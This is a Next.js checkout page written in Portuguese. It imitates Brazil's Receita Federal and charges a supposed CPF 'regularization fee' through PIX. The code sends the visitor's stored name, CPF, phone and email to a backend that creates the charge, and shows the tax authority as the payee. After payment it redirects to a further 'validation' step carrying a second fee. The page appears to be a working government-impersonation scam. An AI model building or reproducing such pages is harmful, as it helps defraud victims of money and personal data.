"use client"

import {
  Menu,
  Copy,
  Check,
  Loader2,
  Clock,
  CheckCircle2,
  QrCode,
  Smartphone,
  CreditCard,
  ShieldCheck,
  Lock,
} from "lucide-react"
import { useState, useEffect, useCallback, Suspense } from "react"
import { useSearchParams, useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"

interface PixData {
  qrCodeBase64: string
  copiaECola: string
  txid: string
  expiration: string
  amountCents: number
}

function PixCPFContent() {
  const searchParams = useSearchParams()
  const router = useRouter()
  const placa = searchParams.get("placa") || ""
  const valor = parseFloat(searchParams.get("valor") || "85.00")
  
  const [pixData, setPixData] = useState<PixData | null>(null)
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [copied, setCopied] = useState(false)
  const [paymentStatus, setPaymentStatus] = useState<string>("PENDING")
  const [mounted, setMounted] = useState(false)
  const [customerName, setCustomerName] = useState<string>("")

  useEffect(() => {
    setMounted(true)
  }, [])

  const generatePix = useCallback(async () => {
    try {
      setLoading(true)
      setError(null)

      const storedData = localStorage.getItem("cpfData")
      let customerData = {
        nome: "Cliente",
        cpf: "",
        telefone: "11999999999",
        email: "",
      }

      if (storedData) {
        const parsed = JSON.parse(storedData)
        customerData = {
          nome: parsed.nome || "Cliente",
          cpf: parsed.cpf || "",
          telefone: parsed.telefone || "11999999999",
          email: parsed.email || "",
        }
        setCustomerName(parsed.nome || "")
      }

      if (!customerData.cpf) {
        setError("CPF não encontrado. Por favor, volte e consulte seu CPF novamente.")
        setLoading(false)
        return
      }

      const response = await fetch("/api/pixcpf", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          customerName: customerData.nome,
          customerDocument: customerData.cpf,
          customerPhone: customerData.telefone,
          customerEmail: customerData.email,
          amount: valor,
        }),
      })

      const data = await response.json()

      if (data.success) {
        setPixData({
          qrCodeBase64: data.qrCodeBase64,
          copiaECola: data.copiaECola,
          txid: data.txid,
          expiration: data.expiration,
          amountCents: data.amountCents,
        })
      } else {
        setError(data.error || "Erro ao gerar PIX")
      }
    } catch (err) {
      setError("Erro ao conectar com o servidor")
    } finally {
      setLoading(false)
    }
  }, [valor])

  useEffect(() => {
    if (mounted) {
      generatePix()
    }
  }, [mounted, generatePix])

  useEffect(() => {
    if (!pixData?.txid || paymentStatus === "APPROVED") return

    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/pixcpf?txid=${pixData.txid}`)
        const data = await response.json()
        if (data.success && data.status) {
          setPaymentStatus(data.status)
          if (data.status === "APPROVED") {
            setTimeout(() => {
              router.push(`/validacao?placa=${placa}&valor=18.25`)
            }, 2000)
          }
        }
      } catch (err) {
        // Silent fail for status check
      }
    }

    const interval = setInterval(checkStatus, 5000)
    return () => clearInterval(interval)
  }, [pixData?.txid, paymentStatus, router, placa])

  const copyToClipboard = async () => {
    if (!pixData?.copiaECola) return

    try {
      await navigator.clipboard.writeText(pixData.copiaECola)
      setCopied(true)
      setTimeout(() => setCopied(false), 3000)
    } catch (err) {
      const textArea = document.createElement("textarea")
      textArea.value = pixData.copiaECola
      document.body.appendChild(textArea)
      textArea.select()
      document.execCommand("copy")
      document.body.removeChild(textArea)
      setCopied(true)
      setTimeout(() => setCopied(false), 3000)
    }
  }

  const formatCurrency = (cents: number) => {
    return new Intl.NumberFormat("pt-BR", {
      style: "currency",
      currency: "BRL",
    }).format(cents / 100)
  }

  if (!mounted) {
    return (
      <div className="min-h-screen bg-[#1a3a5c] flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="h-12 w-12 animate-spin text-[#f0c14b] mx-auto" />
          <p className="mt-4 text-white font-medium">Carregando...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-[#1a3a5c]" style={{ fontFamily: "Verdana, sans-serif" }}>
      {/* Header */}
      <header className="bg-[#152d47] py-4">
        <div className="flex justify-center px-4">
          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/receita%20logo-CcJylic56Yrlq63Gv5cnoS4Bw6Eqm7.png" alt="Receita Federal" className="h-12 w-auto" />
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-6">
        {/* Title Section */}
        <div className="bg-[#152d47] text-white p-4 mb-0 rounded-t-lg">
          <div className="flex items-center gap-3">
            <QrCode className="w-8 h-8 text-[#f0c14b]" />
            <div>
              <h1 className="text-xl md:text-2xl font-bold">Pagamento via PIX</h1>
              <p className="text-sm text-gray-300">Taxa de Regularização - CPF</p>
            </div>
          </div>
        </div>

        {/* Yellow Accent Bar */}
        <div className="bg-[#f0c14b] h-2 mb-0"></div>

        {/* Payment Content */}
        <div className="bg-white border border-gray-200 rounded-b-lg">
          {/* Loading State */}
          {loading && (
            <div className="flex flex-col items-center justify-center py-16">
              <div className="bg-[#1a3a5c] rounded-full p-6 mb-6">
                <Loader2 className="h-12 w-12 animate-spin text-[#f0c14b]" />
              </div>
              <p className="text-[#1a3a5c] text-lg font-bold">Gerando QR Code PIX</p>
              <p className="text-gray-500 text-sm mt-2">Aguarde um momento...</p>
            </div>
          )}

          {/* Error State */}
          {error && !loading && (
            <div className="p-6">
              <div className="bg-red-50 border-l-4 border-red-500 p-6">
                <div className="flex items-start gap-3">
                  <div className="bg-red-500 rounded-full p-2">
                    <ShieldCheck className="w-5 h-5 text-white" />
                  </div>
                  <div>
                    <p className="text-red-800 font-bold mb-2">Erro ao gerar pagamento</p>
                    <p className="text-red-700 text-sm mb-4">{error}</p>
                    <Button
                      onClick={generatePix}
                      className="bg-[#1a3a5c] hover:bg-[#152d47] text-white"
                    >
                      Tentar novamente
                    </Button>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Payment Approved State */}
          {paymentStatus === "APPROVED" && (
            <div className="p-6">
              <div className="bg-green-50 border-l-4 border-green-500 p-8 text-center">
                <div className="bg-green-500 rounded-full p-4 w-20 h-20 mx-auto mb-4 flex items-center justify-center">
                  <CheckCircle2 className="w-12 h-12 text-white" />
                </div>
                <h2 className="text-2xl font-bold text-green-800 mb-2">Pagamento Confirmado!</h2>
                <p className="text-green-700 mb-6">
                  Redirecionando para a próxima etapa...
                </p>
              </div>
            </div>
          )}

          {/* PIX Data */}
          {pixData && !loading && !error && paymentStatus !== "APPROVED" && (
            <div>
              {/* Amount Header */}
              <div className="bg-[#e9ecef] p-4 border-b border-gray-200">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-gray-600">Beneficiário</p>
                    <p className="font-bold text-[#1a3a5c]">Receita Federal - CPF</p>
                  </div>
                  <div className="text-right">
                    <p className="text-sm text-gray-600">Valor total</p>
                    <p className="text-2xl md:text-3xl font-bold text-[#1a3a5c]">
                      {formatCurrency(pixData.amountCents)}
                    </p>
                  </div>
                </div>
              </div>

              <div className="p-6">
                {/* Customer Info */}
                {customerName && (
                  <div className="bg-[#f8f9fa] border border-gray-200 p-3 mb-6">
                    <p className="text-sm text-gray-600">
                      Pagador: <span className="font-bold text-[#1a3a5c]">{customerName}</span>
                    </p>
                  </div>
                )}

                {/* QR Code Section */}
                <div className="flex flex-col lg:flex-row gap-8">
                  {/* Left - QR Code */}
                  <div className="flex-1 flex flex-col items-center">
                    <div className="border-2 border-[#1a3a5c] p-1 mb-4">
                      <div className="border border-[#f0c14b] p-3 bg-white">
                        <img
                          src={pixData.qrCodeBase64}
                          alt="QR Code PIX"
                          className="w-56 h-56 md:w-64 md:h-64"
                        />
                      </div>
                    </div>
                    <p className="text-center text-sm text-gray-600 max-w-xs">
                      Escaneie o QR Code acima com o aplicativo do seu banco para efetuar o pagamento
                    </p>
                  </div>

                  {/* Right - Copy and Paste + Instructions */}
                  <div className="flex-1">
                    {/* Copy Section */}
                    <div className="bg-[#f8f9fa] border border-gray-200 p-4 mb-4">
                      <div className="flex items-center gap-2 mb-3">
                        <Copy className="w-5 h-5 text-[#1a3a5c]" />
                        <p className="font-bold text-[#1a3a5c]">PIX Copia e Cola</p>
                      </div>
                      <div className="bg-white border border-gray-300 p-3 mb-3 max-h-24 overflow-y-auto">
                        <p className="text-xs text-gray-700 break-all font-mono leading-relaxed">
                          {pixData.copiaECola}
                        </p>
                      </div>
                      <Button
                        onClick={copyToClipboard}
                        className={`w-full font-bold py-3 ${
                          copied
                            ? "bg-green-600 hover:bg-green-700"
                            : "bg-[#f0c14b] hover:bg-[#e0b13b] text-[#1a3a5c]"
                        }`}
                      >
                        {copied ? (
                          <>
                            <Check className="w-5 h-5 mr-2" />
                            Código Copiado!
                          </>
                        ) : (
                          <>
                            <Copy className="w-5 h-5 mr-2" />
                            COPIAR CÓDIGO
                          </>
                        )}
                      </Button>
                    </div>

                    {/* Status */}
                    <div className="bg-[#fff3cd] border-l-4 border-[#f0c14b] p-4 mb-4">
                      <div className="flex items-center gap-2">
                        <Clock className="w-5 h-5 text-[#856404]" />
                        <span className="font-bold text-[#856404]">Aguardando pagamento</span>
                      </div>
                      <p className="text-sm text-[#856404] mt-1">
                        O QR Code expira em 1 hora
                      </p>
                    </div>

                    {/* Instructions */}
                    <div className="bg-[#e7f3ff] border border-[#b6d4fe] p-4">
                      <p className="font-bold text-[#1a3a5c] mb-3 flex items-center gap-2">
                        <Smartphone className="w-5 h-5" />
                        Como pagar:
                      </p>
                      <ol className="space-y-2 text-sm text-[#1a3a5c]">
                        <li className="flex items-start gap-2">
                          <span className="bg-[#1a3a5c] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">1</span>
                          <span>Abra o aplicativo do seu banco</span>
                        </li>
                        <li className="flex items-start gap-2">
                          <span className="bg-[#1a3a5c] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">2</span>
                          <span>Acesse a opção PIX</span>
                        </li>
                        <li className="flex items-start gap-2">
                          <span className="bg-[#1a3a5c] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">3</span>
                          <span>Escolha QR Code ou Copia e Cola</span>
                        </li>
                        <li className="flex items-start gap-2">
                          <span className="bg-[#1a3a5c] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">4</span>
                          <span>Confirme os dados e finalize</span>
                        </li>
                      </ol>
                    </div>
                  </div>
                </div>

                {/* Security Footer */}
                <div className="mt-6 pt-6 border-t border-gray-200">
                  <div className="flex flex-wrap items-center justify-center gap-6 text-sm text-gray-600">
                    <div className="flex items-center gap-2">
                      <ShieldCheck className="w-5 h-5 text-green-600" />
                      <span>Pagamento Seguro</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <CreditCard className="w-5 h-5 text-[#1a3a5c]" />
                      <span>PIX Instantâneo</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <Lock className="w-5 h-5 text-[#1a3a5c]" />
                      <span>Dados Protegidos</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  )
}

export default function PixCPFPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-[#1a3a5c] flex items-center justify-center">
          <Loader2 className="h-12 w-12 animate-spin text-[#f0c14b]" />
        </div>
      }
    >
      <PixCPFContent />
    </Suspense>
  )
}
